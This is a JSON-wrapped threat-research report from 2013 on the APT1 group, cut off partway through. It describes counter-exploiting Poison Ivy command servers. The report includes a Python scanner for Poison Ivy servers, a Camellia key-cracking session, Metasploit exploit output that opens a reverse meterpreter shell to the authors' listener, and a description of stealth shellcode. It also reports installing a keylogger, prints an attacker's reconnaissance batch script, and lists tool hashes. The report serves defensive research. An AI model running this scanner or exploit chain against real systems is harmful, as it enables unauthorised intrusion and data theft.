{
    "id": "fd9f1403-ffcf-4305-a2bc-43f8bafe83c0",
    "created_at": "2022-10-25T16:48:20.242537Z",
    "updated_at": "2025-03-27T02:16:01.153209Z",
    "deleted_at": null,
    "sha1_hash": "26353a7703ce0b186450134a5321ac37d1405380",
    "title": "Apt1: Technical Backstage",
    "authors": "Malware.lu, itrust",
    "file_creation_date": "2013-03-27T08:32:37Z",
    "file_modification_date": "2013-03-27T08:32:37Z",
    "file_size": 1750876,
    "plain_text": "#### Public document\n\n# APT1: technical backstage\n\n## malware analysis\n\n\n### General information\n\n\n**Sequence number** 002\n\n**Version** 1.0\n\n**State** Final\n\n**Approved by** Paul Rascagnères\n\n**Approval date** 27/03/2013\n\n**Classification** Public\n\n\n-----\n\n### History\n\n**Version** **Date** **Author** **Modifications**\n\n0.1 12/03/2013 P. Rascagnères Document creation\n\n0.2 13/03/2013 P. Rascagnères Document update\n\n0.3 14/03/2013 P. Rascagnères Document update\n\n0.4 15/03/2013 P. Rascagnères Appendix creation\n\n0.5 17/03/2013 C. Harpes Proofreading\n\n0.6 17/03/2013 P. Rascagnères Screenshot modification\n\n0.7 24/03/2013 P. Rascagnères Shellcode part\n\n0.8 25/03/2013 P. Rascagnères Corrections\n\n1.0 27/03/2013 P. Rascagnères Final version\n\nR f RAP002 APT1 T h i l b k t 1 0 V i 1 0 P 2 f 48\n\n|Version|Date|Author|Modifications|\n|---|---|---|---|\n|0.1|12/03/2013|P. Rascagnères|Document creation|\n|0.2|13/03/2013|P. Rascagnères|Document update|\n|0.3|14/03/2013|P. Rascagnères|Document update|\n|0.4|15/03/2013|P. Rascagnères|Appendix creation|\n|0.5|17/03/2013|C. Harpes|Proofreading|\n|0.6|17/03/2013|P. Rascagnères|Screenshot modification|\n|0.7|24/03/2013|P. Rascagnères|Shellcode part|\n|0.8|25/03/2013|P. Rascagnères|Corrections|\n|1.0|27/03/2013|P. Rascagnères|Final version|\n\n\n-----\n\n### Table of contents\n\n**1** **Introduction ............................................................................................................................ 5**\n**1.1** **Context .................................................................................................................................................... 5**\n**1.2** **Objectives ............................................................................................................................................... 5**\n**1.3** **Authors .................................................................................................................................................... 5**\n**1.4** **Ethical choices ....................................................................................................................................... 5**\n**1.5** **Document structure ............................................................................................................................... 5**\n**2** **Information gathering ............................................................................................................. 6**\n**2.1** **Command & Control scanner ............................................................................................................... 6**\n**2.2** **IP ranges ................................................................................................................................................. 7**\n**2.3** **Working hours ........................................................................................................................................ 7**\n**3** **Poison Ivy ............................................................................................................................... 8**\n**3.1** **Description .............................................................................................................................................. 8**\n**3.2** **Remote code execution vulnerability................................................................................................... 8**\n**3.3** **Encryption key brute forcing ................................................................................................................ 8**\n**3.4** **Exploitation ............................................................................................................................................. 9**\n**3.5** **Shellcode .............................................................................................................................................. 11**\n**4** **Information obtained on the C&C ........................................................................................ 12**\n**4.1** **Infrastructure schema.......................................................................................................................... 12**\n**4.2** **Tools ...................................................................................................................................................... 15**\n**4.3** **Targets .................................................................................................................................................. 16**\n**5** **Terminator RAT (aka Fakem RAT) ....................................................................................... 18**\n**5.1** **Description ............................................................................................................................................ 18**\n**5.2** **Password protection ............................................................................................................................ 18**\n**5.3** **Features and usage.............................................................................................................................. 19**\n**5.4** **Scanner ................................................................................................................................................. 25**\n**5.5** **Remote code execution vulnerability................................................................................................. 25**\n**6** **Conclusion ............................................................................................................................ 27**\n**Appendix ...................................................................................................................................... 28**\n\n**Poison Ivy exploit ........................................................................................................................................ 28**\n**Camellia plugin for John the Ripper .......................................................................................................... 31**\n**Terminator (aka Fakem RAT) password brute forcer ............................................................................... 34**\n**Terminator (aka Fakem RAT) exploit ......................................................................................................... 35**\n**Shellcode ...................................................................................................................................................... 37**\n\nR f RAP002 APT1 T h i l b k t 1 0 V i 1 0 P 3 f 48\n\n\n-----\n\n### List of figures\n\nFigure 1: Attackers working hours ................................................................................................... 7\nFigure 2: Network schema ............................................................................................................. 12\nFigure 3: Proxy server login window .............................................................................................. 13\nFigure 4: Poison Ivy interface with the list of connected machines ................................................ 13\nFigure 5: Poison Ivy interface with a shell ...................................................................................... 14\nFigure 6: Example of network target diagram ................................................................................ 17\nFigure 7: Terminator password ...................................................................................................... 18\nFigure 8: Terminator CRC algorithm .............................................................................................. 19\nFigure 9: Terminator xor and compare operation on the password ................................................ 19\nFigure 10: Terminator: starting interface ........................................................................................ 20\nFigure 11: Terminator: Protocol and port choice ............................................................................ 20\nFigure 12: Terminator: List of infected machines ........................................................................... 20\nFigure 13: Terminator: List of features ........................................................................................... 21\nFigure 14: Terminator: List of processes on the infected machine ................................................. 22\nFigure 15: Terminator: List of opened ports on the infected machine............................................. 22\nFigure 16: Terminator: Remote shell on the infected machine ....................................................... 23\nFigure 17: Terminator: Registry access to the infected machine .................................................... 23\nFigure 18: Terminator: Services management on the infected machine ........................................ 24\nFigure 19: Terminator: Information about the infected machine ..................................................... 24\nFigure 20: Terminator: Installed software on the infected machine ................................................ 25\n\nR f RAP002 APT1 T h i l b k t 1 0 V i 1 0 P 4 f 48\n\n\n-----\n\n# 1 Introduction\n\n### 1.1 Context\n\nThe company Mandiant published in February 2013 a report about an Advance Persistent Threat\n[(APT) called APT1. The report can be freely downloaded here: http://intelreport.mandiant.com/.](http://intelreport.mandiant.com/)\n\nInspired by this article, we have decided to perform our own technical analysis of this case. In the\nreport, Mandiant explains that the attackers were using a well-known Remote Administration Tool\n(RAT) called Poison Ivy and that they were located in China. We based our investigation based on\nthose two facts only.\n\n### 1.2 Objectives\n\nThe objective of the mission was to understand how these attackers work. Our purpose was to\nidentify their infrastructures, their methodologies and also the tools they used. We are convinced\nthat in order to protect our infrastructures against this kind of attacks, we need to analyse, learn\nand understand the way attackers work.\n\n### 1.3 Authors\n\nThis report has been created by Malware.lu CERT, the first private Computer Security Incident\nResponse Team (CSIRT) located in Luxembourg and itrust consulting S.A.R.L, a Luxembourg\nbased company specialising in formation system security.\n\nWe would like to thank the incident response teams who have collaborated with us. Thanks for\ntheir help and for their support.\n\n### 1.4 Ethical choices\n\nIn this chapter is described our approach about the ethical choices made during this work.\n\nFirst, we warned the national and/or private Computer Security Incident Response Teams (CSIRT\n\n- CERT) associated to the targets of the attackers. Before publishing this report, we have waited\nfor a reasonable time. Finally, all the servers from which we collected data belonged to the\nattackers. We do not attack or try to attack compromised machines.\n\n### 1.5 Document structure\n\nThis document is structured in the following way:\n\n  - Chapter 2 deals with the information gathering phase;\n\n  - Chapter 3 describes the malware Poison Ivy and a vulnerability of it;\n\n  - Chapter 4 is a static analysis of samples;\n\n  - Chapter 5 deals with the information we gathered on the attacked command & control;\n\n  - Chapter 6 introduces an homemade RAT called terminator;\n\nR f RAP002 APT1 T h i l b k t 1 0 V i 1 0 P 5 f 48\n\n\n-----\n\n# 2 Information gathering\n\n### 2.1 Command & Control scanner\n\nIn the Mandiant report, it is explained that the attacker used a well-known Remote Administration\nTool (RAT) called Poison Ivy. This RAT can be freely downloaded here: [http://www.poisonivy-](http://www.poisonivy-rat.com/)\n[rat.com/. This RAT will be discussed in the next chapter.](http://www.poisonivy-rat.com/)\n\nTo identify the machines that were using this RAT, we have developed a Poison Ivy scanner. Here\nis the code of this scanner:\n```\ndef check_poison(self, host, port, res):\n  try:\n    af, socktype, proto, canonname, sa = res\n    s = socket.socket(af, socktype, proto)\n    s.settimeout(6)\n    s.connect(sa)\n    stage1 = \"\\x00\" * 0x100\n    s.sendall(stage1)\n    data = s.recv(0x100)\n    if len(data) != 0x100:\n      s.close()\n      return\n    data = s.recv(0x4)\n    s.close()\n    if data != \"\\xD0\\x15\\x00\\x00\":\n      return\n    print \"%s Poison %s %s:%d\" % (datetime.datetime.now(), host,\nsa[0], sa[1])\n  except socket.timeout as e:\n    pass\n  except socket.error as e:\n    pass\n\n```\nThe scanner sends 100 times 0x00 to a specific port and IP. If in the response the server sends\nback 100 other bytes followed by the specific data 0x000015D0, we know that the running service\nis a Poison Ivy server.\n\nWe chose to scan the following ports:\n\n  - 3460 (default Poison Ivy port)\n\n  - 80 (HTTP port)\n\n  - 443 (HTTPS port)\n\n  - 8080 (alternate HTTP port).\n\nWe decided to scan a wide IP range located in Hong Kong.\n\nR f RAP002 APT1 T h i l b k t 1 0 V i 1 0 P 6 f 48\n\n\n-----\n\n### 2.2 IP ranges\n\nAfter removing false positives, we identified 6 IP ranges where Poison Ivy Command & Control\nservers were running:\n\n   - 113.10.246.0 - 113.10.246.255: managed by NWT Broadband Service\n\n   - 202.65.220.0 - 202.65.220.255: managed by Pacific Scene\n\n   - 202.67.215.0 - 202.67.215.255: managed by HKNet Company\n\n   - 210.3.0.0 - 210.3.127.255: managed by Hutchison Global Communications\n\n   - 219.76.239.216 - 219.76.239.223: managed by WINCOME CROWN LIMITED\n\n   - 70.39.64.0 – 70.39.127.255: managed by Sharktech\n\n### 2.3 Working hours\n\nWe had some difficulties to identify the C&C servers because the attackers stopped the Poison Ivy\ndaemon when they were not using it. That explains why the scanner did not identify all the C&C\nservers at certain moments of the day. However, using this parameter, we were able to identify\ntheir working hours. Here is the average working hours for a week (the hour on the graph is\nUTC+1):\n\nFigure 1: Attackers working hours\n\nGenerally, the attackers worked between 2AM and 10AM from Monday to Saturday included.\n\nR f RAP002 APT1 T h i l b k t 1 0 V i 1 0 P 7 f 48\n\n\n-----\n\n# 3 Poison Ivy\n\n### 3.1 Description\n\nPoison Ivy is a Remote Administration Tool (RAT) available here: [http://www.poisonivy-](http://www.poisonivy-rat.com/index.php?link=download)\n[rat.com/index.php?link=download. This RAT is well documented on the Internet. Here is a short list](http://www.poisonivy-rat.com/index.php?link=download)\nof the features it provides:\n\n   - File management;\n\n   - File search;\n\n   - File transfer;\n\n   - Registry management;\n\n   - Process management;\n\n   - Services management;\n\n   - Remote shell;\n\n   - Screenshot creation;\n\n   - Hash stealing;\n\n   - Audio capture;\n\n   - …\n\n### 3.2 Remote code execution vulnerability\n\nAn exploitable vulnerability has been discovered by Andrzej Dereszowski from SIGNAL 11. The\ndescription of the vulnerability can be found here: [http://www.signal11.eu/en/research/articles/](http://www.signal11.eu/​en/research/​articles/​targeted_2010.pdf)\n[targeted_2010.pdf. This vulnerability allows the remote execution of arbitrary code on the](http://www.signal11.eu/​en/research/​articles/​targeted_2010.pdf)\ncommand & control server. Metasploit framework provides an exploit to use this vulnerability. The\ncode is available here: [http://dev.metasploit.com/redmine/projects/framework/repository/entry/](http://dev.metasploit.com/redmine/projects/framework/repository/entry/modules/exploits/windows/misc/poisonivy_bof.rb)\n[modules/exploits/windows/misc/poisonivy_bof.rb.](http://dev.metasploit.com/redmine/projects/framework/repository/entry/modules/exploits/windows/misc/poisonivy_bof.rb)\n\nThis exploit did not work in our context. The exploit has two possible exploitations:\n\n   - by using the default password: admin\n\n   - by using brute force\n\nAs the two methods did not work; we created a third one. This method consists of finding the real\npassword used for the encryption. Our homemade exploit with an option for the password is\navailable in Appendix.\n\nFor information, an additional Ruby package is needed to use the camellia cipher. The package\ncan be installed using the gem command:\n\n```\nroot@alien:# gem install camellia-rb\n\n```\n\nThe next step was to find the password used to encrypt the communication.\n\n### 3.3 Encryption key brute forcing\n\nThe RAT uses a key to encrypt the communication. The password is set by the administrator and\nits default value is “admin”. After a quick search on the Internet, we know that Poison Ivy uses\nCamellia as encryption algorithm. The encryption is made with 16 bytes blocks. So we decided to\nchoose the following approach:\n\n   - Send 100 bytes (with 0x00) to the daemon (same than in our scanner)\n\n   - Get the first 16 bytes as result from the server\n\nHere is the formula of the result:\n\nR f RAP002 APT1 T h i l b k t 1 0 V i 1 0 P 8 f 48\n\n\n-----\n\nResult = Camellia(16*0x00, key)\n\nThe result is not a printable value. Thus, we decided to make a base64 of this value and add the\nflag $camellia$ to identify the algorithm. Here is an example of result:\n\n```\n$camellia$ItGoyeyQIvPjT/qBoDKQZg==\n\n```\n\nTo get the key, we developed a “John the Ripper” extension. “John the Ripper” is an open source\npassword cracker. The source code can be downloaded here: [http://www.openwall.com/john/.](http://www.openwall.com/john/)\nOpenSSL provides the camellia algorithm. The code source of the “John the Ripper” plugin to\ncrack camellia hashes by using the OpenSSL library is available in the appendix.\n\nAfter compiling “John the Ripper”, a new format is available: camellia. Here is an example of a\nbrute force session:\n```\nrootbsd@alien:~/john-1.7.9-jumbo-7/run$ cat test.txt \n$camellia$ItGoyeyQIvPjT/qBoDKQZg==\nrootbsd@alien:~/john-1.7.9-jumbo-7/run$ ./john --format=camellia test.txt \nLoaded 1 password hash (Camellia bruteforce [32/32])\nNo password hashes left to crack (see FAQ)\nrootbsd@alien:~/john-1.7.9-jumbo-7/run$ ./john --show test.txt \n?:pswpsw\n1 password hash cracked, 0 left\n\n```\nThe key is “pswpsw”. This key must be used in our homemade Metasploit exploit.\n\n### 3.4 Exploitation\n\nWith the information we previously described, we were able to get access to the attackers servers.\n```\nmsf exploit(poisonivy_bof_v2) > show options\nModule options (exploit/windows/misc/poisonivy_bof_v2):\n  Name    Current Setting Required Description\n  ----    --------------- -------- ----------  Password  pswpsw      yes    Client password\n  RANDHEADER false      yes    Send random bytes as the header\n  RHOST    X.X.X.X     yes    The target address\n  RPORT    80        yes    The target port\nPayload options (windows/meterpreter/reverse_https):\n  Name   Current Setting Required Description\n  ----   --------------- -------- ----------  EXITFUNC thread      yes    Exit : seh, thread, process, none\n  LHOST   my_server    yes    The local listener hostname\n  LPORT   8443       yes    The local listener port\nExploit target:\n  Id Name\n\n```\nR f RAP002 APT1 T h i l b k t 1 0 V i 1 0 P 9 f 48\n\n\n-----\n\n```\n  -- ---  0  Poison Ivy 2.3.2 / Windows XP SP3 / Windows 7 SP1\nmsf exploit(poisonivy_bof_v2) > exploit\n[*] Started HTTPS reverse handler on https://my_server:8443/\n[*] Meterpreter session 1 opened (my_server:8443 -> Y.Y.Y.Y:3325) at\n2013-03-07 07:51:57 +0100\nmeterpreter> ipconfig\nInterface 1\n============\nName     : MS TCP Loopback interface\nHardware MAC : 00:00:00:00:00:00\nMTU     : 1520\nIPv4 Address : 127.0.0.1\nIPv4 Netmask : 255.0.0.0\nInterface 2\n============\nName     : AMD PCNET Family PCI Ethernet Adapter \n```\n���ݰ��ƻ�����ݰ�˿ݰ�\n```\nHardware MAC : 00:0c:29:c9:86:57\nMTU     : 1500\nIPv4 Address : 192.168.164.128\nIPv4 Netmask : 255.255.255.0\n\n```\nOnce connected to the Poison Ivy server, we noticed that the server had no public IP. We attacked\na server with the IP X.X.X.X (identified during the scan) and the meterpreter endpoint IP address\nwas Y.Y.Y.Y. We concluded that the Poison Ivy daemon was hidden behind a proxy server, by\nusing port forwarding to hide the real IP of the command & control server. We could also identify\nthat the vendor ID of the MAC address is VMWare. By listing the processes, we are able to\nvalidate this hypothesis:\n```\nmeterpreter > ps aux\nProcess List\n============\n PID  PPID Name        User          Path\n ---  ---- ----        ----          --- 0   0   [System Process]               \n 4   0   System                       \n 248  704  P232.exe      WILLOW-3796929A\\willow C:\\VIP\\IVY\\P232.exe\n 272  780  alg.exe                  C:\\WINDOWS\\System32\\alg.exe\n 440  4   smss.exe      NT AUTHORITY\\SYSTEM   \\SystemRoot\\System32\\smss.exe\n 704  604  explorer.exe    WILLOW-3796929A\\willow C:\\WINDOWS\\Explorer.EXE\n 712  440  csrss.exe     NT AUTHORITY\\SYSTEM   \\??\\C:\\WINDOWS\\system32\\csrss.exe\n 736  440  winlogon.exe    NT AUTHORITY\\SYSTEM   \\??\\C:\\WINDOWS\\system32\\winlogon.exe\n 780  736  services.exe    NT AUTHORITY\\SYSTEM   C:\\WINDOWS\\system32\\services.exe\n 792  736  lsass.exe     NT AUTHORITY\\SYSTEM   C:\\WINDOWS\\system32\\lsass.exe\n 896  1228 wuauclt.exe    WILLOW-3796929A\\willow C:\\WINDOWS\\system32\\wuauclt.exe\n 960  780  vmacthlp.exe    NT AUTHORITY\\SYSTEM   C:\\Program Files\\VMware\\VMware \n                                   Tools\\vmacthlp.exe\n 976  780  svchost.exe    NT AUTHORITY\\SYSTEM   C:\\WINDOWS\\system32\\svchost.exe\n 1048 780  svchost.exe                C:\\WINDOWS\\system32\\svchost.exe\n 1176 704  VMwareTray.exe   WILLOW-3796929A\\willow C:\\Program Files\\VMware\\VMware \n                                   Tools\\VMwareTray.exe\n 1200 780  cmdagent.exe    NT AUTHORITY\\SYSTEM   C:\\Program Files\\COMODO\\COMODO Internet \n\n```\nR f RAP002 APT1 T h i l b k t 1 0 V i 1 0 P 10 f 48\n\n\n-----\n\n```\n                                   Security\\cmdagent.exe\n 1228 780  svchost.exe    NT AUTHORITY\\SYSTEM   C:\\WINDOWS\\system32\\svchost.exe\n 1328 704  VMwareUser.exe   WILLOW-3796929A\\willow C:\\Program Files\\VMware\\VMware \n                                   Tools\\VMwareUser.exe\n 1384 780  svchost.exe                C:\\WINDOWS\\system32\\svchost.exe\n 1448 780  svchost.exe                C:\\WINDOWS\\system32\\svchost.exe\n 1472 780  ZhuDongFangYu.exe NT AUTHORITY\\SYSTEM   C:\\Program \n                                   Files\\360\\360Safe\\\n                                   deepscan\\zhudongfangyu.exe\n 1568 780  spoolsv.exe    NT AUTHORITY\\SYSTEM   C:\\WINDOWS\\system32\\spoolsv.exe\n 1592 704  ctfmon.exe     WILLOW-3796929A\\willow C:\\WINDOWS\\system32\\ctfmon.exe\n 1860 780  VMwareService.exe NT AUTHORITY\\SYSTEM   C:\\Program Files\\VMware\\VMware \n                                   Tools\\VMwareService.exe\n 2232 1044 xPort.exe     WILLOW-3796929A\\willow C:\\VIP\\CMD\\xPort.exe\n 3072 3032 conime.exe     WILLOW-3796929A\\willow C:\\WINDOWS\\system32\\conime.exe\n 3196 704  cfp.exe      WILLOW-3796929A\\willow C:\\Program Files\\COMODO\\COMODO Internet \n                                   Security\\cfp.exe\n\n### 3.5 Shellcode\n\n```\nAfter a few days the attackers detected our presence on their systems, particularly because of the\nnetwork connections between their Poison Ivy machines and our machines. Using the `netstat`\ncommand they were able to detect our connection. Basically, the Poison Ivy server only had\nconnections originating from the proxy server and no connection from any other IP. In order to stay\nstealth we had to connect to the Poison Ivy server through the proxy server. To establish this\nconnection we decided to create our own shellcode.\n\nThe principle of our shellcode is as follows:\n\n   - Once injected in a process, the shellcode looks for open sockets;\n\n   - Once a opened socket is detected, this socket is closed;\n\n   - After, the shellcode binds itself on the previous open port;\n\n   - From now on, we are going to use the same technique than the one used in meterpreter\n(bind_tcp).\n\nOur shellcode goal is to close the Poison Ivy daemon’s socket and then open our own socket on\nthe same port. Once our socket is opened we can use the proxy chains provided by the attackers\nto connect to the Poison Ivy server. In this case, when attackers checked the opened connections\nusing netstat they could not identify our connection since it appeared to be originating from an\ninfected target…\n\nThe source code of the shellcode can be found in appendix.\n\nR f RAP002 APT1 T h i l b k t 1 0 V i 1 0 P 11 f 48\n\n\n-----\n\n# 4 Information obtained on the C&C\n\n### 4.1 Infrastructure schema\n\nOur investigation allowed us to draw a network schema of the attackers’ infrastructure.\n\nFigure 2: Network schema\n\nThe infected machines communicate with the proxy through the Internet. The proxy server will\nforward the network packets to the Poison Ivy server. The proxy feature is done by an executable\ncalled xport.exe. This executable can encode network traffic using a xor operation. This feature\nrequires having the executable running on both machines: the proxy and the Poison Ivy server.\nThe syntax on the proxy server is:\n\n```\nxport.exe Proxy_ip proxy_port Poison_Ivy_ip Poison_Ivy_port number\n\n```\n\nThe argument number can either be set to 1 or 2 and represents the two different encoding keys.\nThe syntax on the Poison Ivy server is:\n\nR f RAP002 APT1 T h i l b k t 1 0 V i 1 0 P 12 f 48\n\n\n-----\n\n```\nxport.exe Poison_Ivy_ip Poison_Ivy_port localhost Poison_Ivy_daemon_port\nnumber\n\n```\nThe Poison Ivy server is managed by the attackers through a VMWare remote desktop, so that we\nwere not able to get the real IP address of the attacker. During our investigation, we identified an\nestablished Remote Desktop Protocol (RDP) connection between the Poison Ivy server and the\nproxy server. We decided to install a key-logger on the Poison Ivy server that allowed us to see\ncredentials to remotely connect to the proxy server.\n\nSince the attackers use RDP to manage the proxy server and that we had access, we copied the\nWindows event logs. Those logs contained all IPs which established a successful RDP\nauthentication. We identified more than 350 unique IPs:\n\n```\nrootbsd@alien:~/APT1$ cat list_ip.txt | sort –u | wc -l\n\n```\n```\n384\n\n```\n\nWe suppose that this list also contains Poison Ivy servers IPs and maybe IPs of attackers who\ninadvertently connect directly to the proxy).\n\nHere is the screenshot of the proxy RDP authentication:\n\nFigure 3: Proxy server login window\n\nHere is the screenshot of the Poison Ivy interface:\n\nFigure 4: Poison Ivy interface with the list of connected machines\n\nR f RAP002 APT1 T h i l b k t 1 0 V i 1 0 P 13 f 48\n\n\n-----\n\nHere is the screenshot of an attacker using a remote shell to an infected target:\n\nFigure 5: Poison Ivy interface with a shell\n\nUsing those accesses, we managed to exfiltrate a massive amount of files, event logs, netstat\noutputs… The interesting information can be divided in two categories:\n\n   - Information about the tools used by the attackers;\n\n   - Information about the targets.\n\nR f RAP002 APT1 T h i l b k t 1 0 V i 1 0 P 14 f 48\n\n\n-----\n\n### 4.2 Tools\n\nThe following table provides an overview on the discovered tools.\n\n**Name** **MD5** **Description**\n\nKeylogger, log in %APPDATA%/\nKeyX.exe 3d0760bbc1b8c0bc14e8510a66bf6d99\nteeamware.log\n\nUnknown: the binary opens ports 443 and\nTmUpdate.exe b31b9dd9d29330917627f9f916987f3c\n3126\n\nDumps hashes. Usage: ggg.exe <LSASS\nggg.exe 1295f4a3659cb481b6ae051b61567d7d\nProcess ID> <HashFileName>\n\nDumps Hashes (64bits version). Usage:\n\nggg64.exe 3fd2c4507b23e26d427f89129b2476ac ggg64.exe <LSASS Process ID>\n\n<HashFileName>\n\nUnknown: opens the port 80 and uses the\niochttp.exe a476dd10d34064514af906fc37fc12a3\nlibrary https://code.google.com/p/spserver/\n\niochttp3.exe d91a6d50702822330acac8b36b15bb6c [Unknown: open the port 80 and uses the ]\n\nlibrary https://code.google.com/p/spserver/\nippmin.exe ffea249e19495e02d61aa52e981cebd8 Unpacked version of TmUpdate.exe\n\nThis tool will listen on the port-[localport]\nat the same time, receive two connections\n\nm.exe 5b4d4d6d77954107d927eb1987dd43fb on the same port, and exchanges data\n\nbetween two connections. Usage:\nMapPort2 [localport] [localip]\n\nThis tool will build two connections, One is\nfrom local host to raddr1:rport1,another is\nfrom local host to raddr2:rport2 and it will\n\nmap.exe 266fbfd5cacfcac975e11a3dacd91923\n\nexchange data between these two\nconnections. Usage: MapPort3 [raddr1]\n\n[rport1] [raddr2] [rport2]\nnc.exe ab41b1e2db77cebd9e2779110ee3915d Official netcat binary\n\nnc1.exe 8be39ba7ced43bef5b523193d94320eb Packed version of netcat\n\nnc2.exe 2937e2b37d8bb3d9fe96ded7e6f763aa Packed version of netcat\n\nputty.exe 9bb6826905965c13be1c84cc0ff83f42 Official putty binary\n\nxPort.exe 2aabd170dae5982e5d93dc6fd9f2723a Port forward tool\n\npwdump.dll 7a115108739c7d400b4e036fe995519f Password dump 64 bits (library)\n\npwdump.exe f140e0e9aab19fefb7e47d1ea2e7c560 Password dump 64 bits (binary)\n\n_Private_ a78cbc7d652955be49498ee9834e6a2d [RAT, we keep the name private because it ]\n\ncontains the name of the target\n\nRAT, we keep the name private because it\n_Private_ 40a3e68eafd50c02b076acf71d1569db\ncontains the name of the target\n\nRAT, we keep the name private because it\n_Private_ 5682aa66f0d1566cf3b7e27946943b4f\ncontains the name of the target\n\n_Private_ c16269c4a32062863b63a123951166d2 [RAT, we keep the name private because it ]\n\ncontains the name of the target\nTerminator3.6. Homemade RAT server called Terminator\n669cef1b64aa530292cc823981c506f6\nexe (aka Fakem RAT)\n\nMalware sample of the RAT Terminator\nShtrace.exe 380fe92c23f2028459f54cb289c3553f\n(aka Fakem RAT)\nEXP.EXE e258cf52ef4659ed816f3d084b3ec6c7 The binary contains Oracle DB queries\n\nR f RAP002 APT1 T h i l b k t 1 0 V i 1 0 P 15 f 48\n\n|Name|MD5|Description|\n|---|---|---|\n|KeyX.exe|3d0760bbc1b8c0bc14e8510a66bf6d99|Keylogger, log in %APPDATA%/ teeamware.log|\n|TmUpdate.exe|b31b9dd9d29330917627f9f916987f3c|Unknown: the binary opens ports 443 and 3126|\n|ggg.exe|1295f4a3659cb481b6ae051b61567d7d|Dumps hashes. Usage: ggg.exe <LSASS Process ID> <HashFileName>|\n|ggg64.exe|3fd2c4507b23e26d427f89129b2476ac|Dumps Hashes (64bits version). Usage: ggg64.exe <LSASS Process ID> <HashFileName>|\n|iochttp.exe|a476dd10d34064514af906fc37fc12a3|Unknown: opens the port 80 and uses the library https://code.google.com/p/spserver/|\n|iochttp3.exe|d91a6d50702822330acac8b36b15bb6c|Unknown: open the port 80 and uses the library https://code.google.com/p/spserver/|\n|ippmin.exe|ffea249e19495e02d61aa52e981cebd8|Unpacked version of TmUpdate.exe|\n|m.exe|5b4d4d6d77954107d927eb1987dd43fb|This tool will listen on the port-[localport] at the same time, receive two connections on the same port, and exchanges data between two connections. Usage: MapPort2 [localport] [localip]|\n|map.exe|266fbfd5cacfcac975e11a3dacd91923|This tool will build two connections, One is from local host to raddr1:rport1 ,another is from local host to raddr2:rport2 and it will exchange data between these two connections. Usage: MapPort3 [raddr1] [rport1] [raddr2] [rport2]|\n|nc.exe|ab41b1e2db77cebd9e2779110ee3915d|Official netcat binary|\n|nc1.exe|8be39ba7ced43bef5b523193d94320eb|Packed version of netcat|\n|nc2.exe|2937e2b37d8bb3d9fe96ded7e6f763aa|Packed version of netcat|\n|putty.exe|9bb6826905965c13be1c84cc0ff83f42|Official putty binary|\n|xPort.exe|2aabd170dae5982e5d93dc6fd9f2723a|Port forward tool|\n|pwdump.dll|7a115108739c7d400b4e036fe995519f|Password dump 64 bits (library)|\n|pwdump.exe|f140e0e9aab19fefb7e47d1ea2e7c560|Password dump 64 bits (binary)|\n|Private|a78cbc7d652955be49498ee9834e6a2d|RAT, we keep the name private because it contains the name of the target|\n|Private|40a3e68eafd50c02b076acf71d1569db|RAT, we keep the name private because it contains the name of the target|\n|Private|5682aa66f0d1566cf3b7e27946943b4f|RAT, we keep the name private because it contains the name of the target|\n|Private|c16269c4a32062863b63a123951166d2|RAT, we keep the name private because it contains the name of the target|\n|Terminator3.6. exe|669cef1b64aa530292cc823981c506f6|Homemade RAT server called Terminator (aka Fakem RAT)|\n|Shtrace.exe|380fe92c23f2028459f54cb289c3553f|Malware sample of the RAT Terminator (aka Fakem RAT)|\n|EXP.EXE|e258cf52ef4659ed816f3d084b3ec6c7|The binary contains Oracle DB queries|\n\n\n-----\n\nxForceDel.ex 9fbea622b9a1361637e0b97d7dd34560 Tool to delete lock file\n\nThe RAT called Terminator will be described in the next chapter. We found a batch script similar to\nthe one described in Mandiant’s report:\n```\n @echo off\n echo %computername% >> c:\\recycler\\%computername%_base.dat\n qwinsta >> c:\\recycler\\%computername%_base.dat\n date /t >> c:\\recycler\\%computername%_base.dat\n time /t >> c:\\recycler\\%computername%_base.dat\n ipconfig /all >> c:\\recycler\\%computername%_base.dat\n nbtstat -n >> c:\\recycler\\%computername%_base.dat\n systeminfo >> c:\\recycler\\%computername%_base.dat\n set >> c:\\recycler\\%computername%_base.dat\n net share >> c:\\recycler\\%computername%_base.dat\n net start >> c:\\recycler\\%computername%_base.dat\n tasklist /v >> c:\\recycler\\%computername%_base.dat\n netstat -ano >> c:\\recycler\\%computername%_base.dat\n dir c:\\ /a >> c:\\recycler\\%computername%_base.dat\n dir d:\\ /a >> c:\\recycler\\%computername%_base.dat\n dir c:\\progra~1 >> c:\\recycler\\%computername%_base.dat\n dir c:\\docume~1 >> c:\\recycler\\%computername%_base.dat\n net view /domain >> c:\\recycler\\%computername%_base.dat\n dir /a /s c:\\ >> c:\\recycler\\%computername%_filelist.dat\n dir /a /s d:\\ >> c:\\recycler\\%computername%_filelist.dat\n del c:\\recycler\\base.bat\n\n```\nThe purpose of this batch script is to get information about an infected workstation. In addition, we\nfound a directory with the official SecureCrt, which is an SSH client. We also found the\nSysInternals suite from Microsoft.\n\n### 4.3 Targets\n\nThe attackers seem to use a dedicated proxy and Poison Ivy server combination for each target.\nWhen a target discovers the IP address of a proxy, this address is reassigned to another target.\nThat’s why it is primordial to share the C&C servers IPs with our partners. The targets were\nprivate and public companies, political institutions, activists, associations or reporters.\n\nOn the Poison Ivy server, a directory is created for every target. Within this directory, a directory for\neach infected machine was created. The naming convention for those directories is\nHOSTNAME^USERNAME. Here is an example:\n\n|getos.exe|71d3f12a947b4da2b7da3bee4193a110|Binary to collect information as group, server and OS via SMB|\n|---|---|---|\n|dump.exe|a4ad1d1a512a7e00d2d4c843ef559a7a|gsecdump v0.7 by Johannes Gumbel|\n|nltest.exe|53b77ada5498ef207d48a76243051a01|http://technet.microsoft.com/en- us/library/cc731935%28v=ws.10%29.aspx|\n|pr.exe|98a65022855013588603b8bed1256d5e|Dotpot Port Scanner Ver 0.92|\n|wget.exe|57a9d084b7d016f776bfc78a2e76d03d|Official wget binary|\n|xForceDel.ex|9fbea622b9a1361637e0b97d7dd34560|Tool to delete lock file|\n\n```\nE:\\companyABCD\\alien^rootbsd\\\n\n```\n\nIn those directories files are not sorted in any specific manner. The documents types are:\n\n   - .PPT\n\nR f RAP002 APT1 T h i l b k t 1 0 V i 1 0 P 16 f 48\n\n\n-----\n\n   - .XLS\n\n   - .DOC\n\n   - .PDF\n\n   - .JPG\n\nAmong those documents, we found:\n\n   - Network diagrams;\n\n   - Internal IP/user/password combination (local administrator, domain administrator, root,\nweb, webcam…);\n\n   - Map of the building with digital code to open doors;\n\n   - Security incident listings;\n\n   - Security policies;\n\n   - …\n\nThe sensitive documents were password protected. The passwords pattern is [a-z]{3,4}[0-9]{3,4},\nso it was easy to brute force them in reasonable time. Here is an example of a network diagram.\n\nFigure 6: 